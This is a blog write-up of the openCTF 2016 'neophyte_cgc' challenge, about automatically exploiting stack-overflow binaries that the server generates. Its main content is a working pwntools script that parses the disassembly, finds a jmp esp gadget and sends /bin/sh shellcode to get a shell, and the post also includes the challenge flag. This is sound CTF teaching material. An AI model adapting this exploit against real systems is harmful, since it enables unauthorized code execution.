---
layout: post
title: openCTF 2016 - neophyte_cgc
category: [Exploitation]
tags: [Exploitation, openCTF]
comments: true
---

**Points:** 300
**Solves:** 
**Category:** Exploitation, CRS
**Description:** CRS (Cyber Reasoning System) are all the rage (and going on right now)
... but they only have 7 syscalls
....we're giving you 190. Good luck.
Server: 172.31.1.46:1622

> [neophyte_cgc]({{site.url}}/assets/neophyte_cgc)

Neophyte_cgc challenge was the easier version of [apprentice_cgc]({{site.url}}/exploitation/2016/08/05/openCTF-apprentice_cgc.html), challenge is about AEG (Automated Exploit Generation).

When connecting to the server, we get a different binary. Well, kinda same same... but different ;). In `main` there's a single byte being checked as a password. If correct byte is supplied execution branches to the `vulnerable` function. If not we return.

![main]({{site.url}}/assets/screen-openctf-5.png)

Vulnerable function just line [apprentice_cgc]({{site.url}}/exploitation/2016/08/05/openCTF-apprentice_cgc.html) has a classic stack overflow with Canaries, NX and ASLR exploit mitigation disabled. One difference is that neophyte binary does not provide us with the address of the stack buffer so we need to find a gadget...

Also the stack frame of the `vulnerable` function is different size on every new binary, so we have to calculate this from the objdump output.

![vuln]({{site.url}}/assets/screen-openctf-6.png)

# Solution

Again, I'm using a ghetto but method that works fast.

1. Connect to the server and get generated binary
2. Drop the binary to disk and analyze it with objdump
3. Send the correct 1 byte password
4. Calculate the stack frame of the vulnerable function from the objdump output
5. Generate shellcode and pwn ;)

{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

# flag DontGetAngr_y___IT_WILL_GET_WORSE

def exploit(r):
  if len(sys.argv) > 1:      # if remote, get the binary from server and store it on disk
    r.recvuntil("Neophyte CGC - Baby's first CRS (Cyber Reasoning System)\n")
    binary = r.recvuntil('Can you exploit me in under 10 seconds?\n')

    ofile = open('neo_drop', 'wb')
    ofile.write(binary)
    ofile.close()

  else:                                   # if trying to pwn locally, use local copy
    binary = bytearray(open('neo_drop', 'r').read())
  
  entry = u32(binary[0x18:0x18+4])        # get entry ptr from elf header
  log.info("Entry point: " + hex(entry))
                                        # use objdump to store disassembly output in variable
  output = subprocess.Popen(["objdump", "-d", "-M", "intel", "neo_drop"], stdout=subprocess.PIPE).communicate()[0].split('\n')

  for line in range(len(output)):
    l = output[line].split(' ')
    if '<vulnerable>:' in l:            # Parse disassembly output to find vulnerable func
      stack = int(output[line+3].split(' ')[-1].split(',')[-1], 16) + 4 # get the sub distance
      if 'sub' in output[line+5]:       # if another sub
        stack += int(output[line+5].split(' ')[-1].split(',')[-1], 16)
      for lv in range(15):
        if 'lea ' in output[line+lv]:   # find offset of local buffer
          bufOffset = int(output[line+lv].split(' ')[-1].split(',')[-1].split('-')[-1].strip(']'), 16)
    if '<main>:' in output[line]:
      for i in range(30):
        if 'getchar' in output[line+i]:
          for x in range(5):
            if 'cmp' in output[line+i+x]: # find 1 byte password
              canary_byte = chr(int(output[line+i+x].split(',')[-1], 16))
              print canary_byte
    if '<__libc_csu_init>:' in l:       # Using this as low boundary 
      break
                                        # Use ROPgadget to find jmp/call esp gadget
  rop_gadget = subprocess.Popen(["ROPgadget", "--binary", "neo_drop", "--only", "jmp|call"], stdout=subprocess.PIPE).communicate()[0].split('\n')

  for line in rop_gadget:
    if 'jmp esp' in line or 'call esp' in line:
      gadget = int(line.split(' ')[0], 16)   # Get addr of gadget
      log.info("Rop gadget found: " + line)

  r.send(canary_byte)                   # Send 1 byte password
  r.recvuntil('good gatekeeper')        # Expect GoodBoy message

  offset = stack - (stack - bufOffset)  # Calculate size of garbage in shellcode

  payload = "A" * offset
  payload += "BBBB"
  payload += p32(gadget)
  payload += ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
          "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

  r.sendline(payload)

  r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/neophyte_cgc'])
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}

{% highlight text %}
➜  openCTF python ./neophyte_solution.py
[*] For remote: ./neophyte_solution.py HOST PORT
[+] Starting program '/vagrant/openCTF/neophyte_cgc': Done
[1902]
[*] Paused (press any to continue)
[*] Entry point: 0x8048420
l
[*] Rop gadget found: 0x080486bf : jmp esp
[*] Switching to interactive mode

$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
$
{% endhighlight %}